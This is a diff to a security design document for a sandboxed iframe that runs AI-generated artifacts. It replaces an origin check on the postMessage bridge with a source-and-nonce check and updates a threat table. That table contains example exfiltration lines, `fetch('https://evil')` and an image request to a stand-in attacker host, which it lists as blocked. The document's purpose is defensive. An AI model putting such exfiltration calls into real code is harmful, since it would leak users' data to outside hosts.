@@ -50,25 +50,34 @@ exfiltrate conversations and phish the owner.
   external links.
 - `allow-top-navigation` is forbidden.
 - `allow-popups-to-escape-sandbox` is forbidden.
-- The parent listens to `postMessage` with an origin check, a source check and
-  a narrow message schema.
+- The parent listens to `postMessage` with a source check, a per-frame nonce and
+  a narrow message schema. It does not rely on `event.origin`: see below.
 
 ## Iframe bridge
 
 ```
-app → artifact: { type: "artifact:init", id, locale, theme }
-artifact → app: { type: "artifact:ready" }
-artifact → app: { type: "artifact:resize", height: number }
-artifact → app: { type: "artifact:result", title?, text?, data? }
+app → artifact: { type: "artifact:init", id, locale, theme, nonce }
+artifact → app: { type: "artifact:ready", nonce }
+artifact → app: { type: "artifact:resize", height: number, nonce }
+artifact → app: { type: "artifact:result", title?, text?, data?, nonce }
 ```
 
-- Accept a message only when `event.origin` equals the artifact origin **and**
-  `event.source === iframe.contentWindow`.
-- Validate the shape; drop unknown types. Limit a result to 64 KiB and
-  rate-limit per artifact.
+- **`event.origin` cannot identify the artifact.** With `sandbox="allow-scripts"`
+  and no `allow-same-origin`, the frame has an opaque origin, so `event.origin`
+  is the string `"null"`. An origin check would reject the artifact's own
+  messages (and `"null"` matches any other opaque frame).
+- The identity check is therefore `event.source === iframe.contentWindow` plus
+  the random `nonce` sent in `artifact:init`. The app posts the init message to
+  `iframe.contentWindow` with `targetOrigin: "*"`, which is safe because the
+  frame is the only recipient and carries no credentials.
+- Do not add `allow-same-origin` to obtain a real origin: that would give the
+  artifact its origin's storage and cookies and defeat the sandbox.
+- Validate the shape; drop unknown types and wrong nonces. Limit a result to
+  64 KiB and rate-limit per artifact.
 - Never render `text` as HTML and never execute `data`. A result becomes a
   composer draft by default.
-- The bridge carries no token, no cookie and no direct app API.
+- The bridge carries no token, no cookie and no direct app API. A nonce is not a
+  credential; it only proves the sender is the frame the app created.
 
 ## CSP for the artifact origin
 
@@ -123,7 +132,7 @@ Notes:
 | Subresource exfiltration | `connect-src 'none'`, no remote images | `fetch('https://evil')` and `new Image().src='https://evil'` both blocked |
 | Self-navigation exfiltration | egress-deny on the artifact container | navigation to an external host fails at the network |
 | Parent DOM access | sandbox | `parent.document` throws |
-| Bridge abuse | origin + source check, schema, size limit | foreign-origin and oversized messages are dropped |
+| Bridge abuse | source + nonce check, schema, size limit | wrong-source/foreign and oversized messages are dropped |
 | Malicious download | `Content-Disposition: attachment` | download requires user action |
 | Resource exhaustion | timeouts, CPU/memory limits | runaway loop is killed |
 
